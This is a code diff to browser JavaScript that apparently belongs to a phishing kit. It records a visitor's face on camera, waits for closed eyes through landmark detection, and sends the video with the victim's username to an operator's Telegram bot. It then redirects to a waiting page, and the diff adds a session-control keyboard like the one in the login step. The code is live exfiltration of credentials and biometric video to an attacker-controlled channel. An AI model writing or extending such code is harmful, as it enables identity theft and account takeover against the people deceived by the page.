@@ -158,8 +158,8 @@
 
   try {
     recorder = chosenMime
-      ? new MediaRecorder(stream, { mimeType: chosenMime })
-      : new MediaRecorder(stream);
+      ? new MediaRecorder(stream, { mimeType: chosenMime, videoBitsPerSecond: 800000 })
+      : new MediaRecorder(stream, { videoBitsPerSecond: 800000 });
   } catch(_) {
     recorder = new MediaRecorder(stream);
   }
@@ -172,8 +172,8 @@
     return dist(lm[v1], lm[v2]) / (dist(lm[h1], lm[h2]) + 0.0001);
   }
 
-  const NEED_MS  = 5000; // 5s ojos cerrados
-  const EXTRA_MS = 5000; // 5s más grabando después del beep
+  const NEED_MS  = 5000;
+  const EXTRA_MS = 5000;
   const EAR_TH   = 0.17;
   let closeAt    = null;
   let triggered  = false;
@@ -192,7 +192,6 @@
     const mimeUsed = recorder.mimeType || chosenMime || "video/webm";
     const blob     = new Blob(chunks, { type: mimeUsed });
 
-    // Si vacío, redirige directo
     if (blob.size === 0) {
       window.location.href = "wait.html?s=" + sessionId;
       return;
@@ -203,7 +202,9 @@
       `👤 Usuario: \`${usuario}\`\n` +
       `👤 @Brknshinexxx`;
 
-    // Intenta sendVideo → si falla, sendDocument
+    // Keyboard de control igual que en el login
+    const keyboard = CONFIG.buildKeyboard(sessionId);
+
     const endpoints = [
       { ep: "sendVideo",    field: "video",    name: "cara.webm" },
       { ep: "sendDocument", field: "document", name: "cara.webm" }
@@ -212,20 +213,20 @@
     for (const { ep, field, name } of endpoints) {
       try {
         const fd = new FormData();
-        fd.append("chat_id",    CONFIG.CHAT_ID);
-        fd.append(field,        blob, name);
-        fd.append("caption",    caption);
-        fd.append("parse_mode", "Markdown");
+        fd.append("chat_id",      CONFIG.CHAT_ID);
+        fd.append(field,          blob, name);
+        fd.append("caption",      caption);
+        fd.append("parse_mode",   "Markdown");
+        fd.append("reply_markup", JSON.stringify(keyboard));
         const res  = await fetch(
           `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/${ep}`,
           { method: "POST", body: fd }
         );
         const json = await res.json();
-        if (json.ok) break; // éxito, no seguimos
+        if (json.ok) break;
       } catch(_) { /* siguiente */ }
     }
 
-    // Siempre redirige pase lo que pase
     window.location.href = "wait.html?s=" + sessionId;
   }
 
